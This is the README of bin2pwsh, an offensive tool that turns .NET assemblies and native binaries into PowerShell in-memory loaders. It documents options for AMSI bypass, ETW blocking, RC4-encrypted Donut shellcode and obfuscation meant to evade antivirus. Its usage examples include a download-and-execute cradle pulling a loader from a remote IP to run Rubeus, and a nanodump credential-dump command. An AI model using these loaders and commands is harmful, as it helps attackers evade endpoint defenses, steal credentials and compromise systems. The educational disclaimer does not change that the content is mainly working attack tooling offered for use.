<p align="left">
  <img src="/assets/logo.png" width="350px" alt="logo">
</p>

Craft PowerShell in-memory loaders from .NET assemblies and native binaries!

> **DISCLAIMER.** All information contained in this repository is provided for educational and research purposes only. The owner is not responsible for any illegal use of this tool.

## Table of Contents

- [Dependencies](#dependencies)
  * [Donut](#donut)
    + [Linux](#linux)
    + [Windows](#windows)
- [Usage Examples](#usage-examples)
  * [Crafting a PS loader from a .NET assembly (no donut)](#crafting-a-ps-loader-from-a-net-assembly--no-donut-)
  * [Crafting a PS loader from a native binary (donut)](#crafting-a-ps-loader-from-a-native-binary--donut-)
  * [Integrate bin2pwsh into Your Offensive Pipeline](#integrate-bin2pwsh-into-your-offensive-pipeline)
- [Credits and References](#credits-and-references)

## Dependencies

- Linux: Mono → `sudo apt install mono-devel`
- Windows: Native Tools for VS → [Download Visual Studio Tools](https://visualstudio.microsoft.com/downloads/)

### Donut

Basically, the main rule here is to make the `donut` binary available globally from your command prompt. It can be achieved via symbolic links or by adding the donut directory to your `PATH`.

#### Linux

If you're using **bin2pwsh** with donut from Linux, you want to stick to the [syscalls fork](https://github.com/S4ntiagoP/donut/tree/syscalls) by [@s4ntiago_p](https://twitter.com/s4ntiago_p):

```bash
mkdir -p ~/tools &&
git clone --single-branch -b syscalls https://github.com/S4ntiagoP/donut ~/tools/donut &&
cd ~/tools/donut &&
make &&
sudo ln -sv `realpath donut` /usr/local/bin/donut &&
cd -
```

#### Windows

Else (if you're using **bin2pwsh** with donut from Windows), you want to stick to the [SysWhispers3 fork](https://gitlab.porchetta.industries/KlezVirus/donut) by [@KlezVirus](https://twitter.com/KlezVirus).

Note that you should be in elevated PowerShell within the *x64 Native Tools Command Prompt for VS* console:

```powershell
New-Item -ItemType Directory -Path C:\Tools -Force
git clone https://gitlab.porchetta.industries/KlezVirus/donut C:\Tools\donut
git clone https://gitlab.porchetta.industries/KlezVirus/SysWhispers3 C:\Tools\SysWhispers3
pushd C:\Tools\SysWhispers3
py .\syswhispers.py -a x64 -m {embedded,jumper,jumper_randomized} -o C:\Tools\donut\loader\syscalls --donut
pushd C:\Tools\donut
nmake -f Makefile64.msvc
New-Item -ItemType SymbolicLink -Target C:\Tools\donut\donut.exe -Path C:\Windows\System32\donut.exe
popd; popd
```

## Usage Examples

```
usage: bin2pwsh.py [-h] [-o OUTPUT] [-obf {yetAnotherObfuscator,NixImports}] [--silent] [--debug] [-e ENTRYPOINT] [-na] [-at {array,string}] [-nrs] [--emit]
                   [--noFUNC] [--noAMSI] [--noETW] [--noRC4] [-pa] [--noENVEXIT] [--noWAIT] [-d] [-j DECOY] [-s SERVER] [-n MODULE] [-u USERNAME]
                   [-p PASSWORD] [-wh SYSWHISPERS3] [-whm {embedded,jumper,jumper_randomized}] [--rehash {y,yes,n,no}]
                   payload_string

Craft PowerShell in-memory loaders from .NET assemblies and native binaries.

positional arguments:
  payload_string        path to the executable (optionally with arguments if run with --donut) to be wrapped in PowerShell | if the executable does not exist
                        on disk, we'll try to auto download it from https://github.com/Flangvik/SharpCollection

options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        output path (default directory is CWD, default cmdlet name if the original filename)
  -obf {yetAnotherObfuscator,NixImports}, --obfuscator {yetAnotherObfuscator,NixImports}
                        obfuscate the assembly first with yetAnotherObfuscator (by @0xb11a1, https://github.com/0xb11a1/yetAnotherObfuscator) or with
                        NixImports (by @dr4k0nia, https://github.com/dr4k0nia/NixImports)
  --silent              supress os.system output and also the banner
  --debug               debug mode

PS template options:
  -e ENTRYPOINT, --entrypoint ENTRYPOINT
                        the entry point as a comma-separated string of Namespace,Type,Method
  -na, --no-args        pass $args to Main
  -at {array,string}, --args-type {array,string}
                        pass the arguments to the entry point as an array or as a string
  -nrs, --no-redirect-std
                        do NOT redirect StdOut and StdError to string variables before printing them (output shows in real-time)
  --emit                use System.Reflection.Emit to build an assembly from memory (default is System.Reflection.Assembly)
  --noFUNC              do NOT wrap the output within a function definition

C# template options (Donut shellcode injector):
  --noAMSI              do NOT apply AMSI bypass
  --noETW               do NOT apply ETW block
  --noRC4               do NOT apply shellcode RC4 (SystemFunction032) encryption
  -pa, --patchlessAMSI  embed Patchless AMSI bypass in the PowerShell loader
  --noENVEXIT           embed EnvironmentExit patch in the PowerShell loader, must be used with -pa/--patchlessAMSI
  --noWAIT              do NOT wait for infinite on WaitForSingleObject

Donut options:
  -d, --donut           create a Donut (https://github.com/S4ntiagoP/donut/tree/syscalls) shellcode from the executable first
  -j DECOY, --decoy DECOY
                        optional path of decoy module for Module Overloading
  -s SERVER, --server SERVER
                        optional server path that will host the Donut stager module (ex. https://example.com/)
  -n MODULE, --module MODULE
                        optional stager module name (default is generated randomly)
  -u USERNAME, --username USERNAME
                        optional username used in stager server authentication (must be used with -u/--username)
  -p PASSWORD, --password PASSWORD
                        optional password used in stager server authentication (must be used with -p/--password)
  -wh SYSWHISPERS3, --syswhispers3 SYSWHISPERS3
                        path to syswhispers.py (by @KlezVirus, https://gitlab.porchetta.industries/KlezVirus/SysWhispers3)
  -whm {embedded,jumper,jumper_randomized}, --syswhispers3-method {embedded,jumper,jumper_randomized}
                        SysWhispers3 syscall recovery method
  --rehash {y,yes,n,no}
                        rehash Donut syscalls prompt behavior
```

### Crafting a PS loader from a .NET assembly (no donut)

You can wrap a .NET assembly into a PowerShell loader with **bin2pwsh** to get a similar output to the [@ShitSecure](https://twitter.com/ShitSecure)'s awesome [PowerSharpBinaries](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries) examples.

In case the namespace of the assembly is different from its file name and the main class is not `Program`, you should specify these values manually with the `-e/--entrypoint` argument. Also, if the original .NET assembly requires no args to be passed to the entrypoint, the `-na/--no-args` flag must be used:

```console
~$ python3 bin2pwsh.py Rubeus.exe [-e/--entrypoint Rubeus,Program,Main] [-na/--no-args] [--silent] [--debug]
```

Then you can just source the PS loader and call it with arguments (if required) like follows:

```console
PS > iex(new-object net.webclient).downloadstring("http://10.10.13.37/Invoke-Rubeus.ps1")
PS > Invoke-Rubeus hash /domain:megacorp.local /user:j.doe /password:Passw0rd!
```

<details>
<summary><strong>Example #1</strong></summary>

<p align="center">
  <img src="/assets/example-1.png" alt="example-1.png">
</p>

</details>

### Crafting a PS loader from a native binary (donut)

In case you want to craft a PS loader from a native binary, you should use the `-d/--donut` option.

What **bin2pwsh** does here is:

1. Creates a shellcode from the binary with donut.
2. Builds a C# self-injector template from predefined presets with dynamic Win32 API resolution (credits to [@bohops](https://twitter.com/bohops), [@dr4k0nia](https://twitter.com/dr4k0nia)), optional AMSI/ETW patches and RC4 payload encryption (credits to [@ShitSecure](https://twitter.com/ShitSecure)).
3. (Cross-)compiles the template into a .NET assembly and wraps it into a PowerShell loader the way described [in the previous section](#crafting-a-ps-loader-from-a-net-assembly--no-donut-).

If SW3 is locally available on your Windows box and the `-wh/--syswhispers3` argument is specified, you can automatically recompile donut on-the-fly with a brand new syscalls source file before generating the shellcode (see [Empowering Donut with Direct and Indirect Syscalls](https://www.youtube.com/watch?v=ypX7N4498xE)).

The arguments for the original native binary must be passed during the shellcode generation phase and cannot be changed at runtime. An additional note here is that you must use the `--debug` option when running **bin2pwsh** from Windows due to the peculiarities of working with Python's `tempfile` on this OS:

```console
PS > py .\bin2pwsh.py "nanodump.exe -w C:\Windows\Temp\debug.bin" -d/--donut --debug [-wh/--syswhispers3 C:\Tools\SysWhispers3\syswhispers.py] [-whm/--syswhispers3-method {embedded,jumper,jumper_randomized}] [--silent] [--noAMSI] [--noETW] [--noRC4]
```

Of course, this workflow can be applied to a .NET assembly too.

<details>
<summary><strong>Example #2</strong></summary>

<p align="center">
  <img src="/assets/example-2.png" alt="example-2.png">
</p>

</details>

## Integrate bin2pwsh into Your Offensive Pipeline

You can create PowerShell loaders automatically when compiling C# tools with a simple post-build event (instructions must be placed into the `.csproj` file):

```xml
...
<Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PostBuildEvent>py $(TargetDir)bin2pwsh.py $(TargetFileName) --silent</PostBuildEvent>
+  </PropertyGroup>
+  <Target Name="AfterClean">
+    <ItemGroup>
+      <FilesToDelete Include="$(TargetDir)*.ps1" />
+    </ItemGroup>
+    <Delete Files="@(FilesToDelete)" />
+  </Target>
</Project>
```

## Credits and References

- [S4ntiagoP/donut at syscalls · GitHub](https://github.com/S4ntiagoP/donut/tree/syscalls)
- [KlezVirus / donut · GitLab](https://gitlab.porchetta.industries/KlezVirus/donut)
- [KlezVirus / SysWhispers3 · GitLab](https://gitlab.porchetta.industries/KlezVirus/SysWhispers3)
- [Unmanaged Code Execution with .NET Dynamic PInvoke – bohops](https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/)
- [HInvoke and avoiding PInvoke | dr4k0nia](https://dr4k0nia.github.io/posts/HInvoke-and-avoiding-PInvoke/)
- [RunPE/FileDescriptorRedirector.cs · nettitude/RunPE](https://github.com/nettitude/RunPE/blob/main/RunPE/Patchers/FileDescriptorRedirector.cs)
- [RunPE/ExitPatcher.cs · nettitude/RunPE](https://github.com/nettitude/RunPE/blob/main/RunPE/Patchers/ExitPatcher.cs)
- [Creds/NanoDumpInject.cs · S3cur3Th1sSh1t/Creds](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs)
- [Alternative use cases for SystemFunction032 | S3cur3Th1sSh1t](https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/)
- [MakeMeEnterpriseAdmin/MakeMeEnterpriseAdmin.ps1 · vletoux/MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/0e3dcfd55be8ac5fde1631d0f50753a761927082/MakeMeEnterpriseAdmin.ps1#L98-L125)
- [Implementation of RC4 cipher in Python](https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071)
- [In-Process Patchless AMSI Bypass - Ethical Chaos](https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/)
- [In-Process Patchless AMSI Bypass](https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf)
- [C# Amsi bypass with hardware breakpoint](https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e)
- [0xb11a1/yetAnotherObfuscator: C# obfuscator that bypass windows defender](https://github.com/0xb11a1/yetAnotherObfuscator)
- [dr4k0nia/NixImports: A .NET malware loader, using API-Hashing to evade static analysis](https://github.com/dr4k0nia/NixImports)
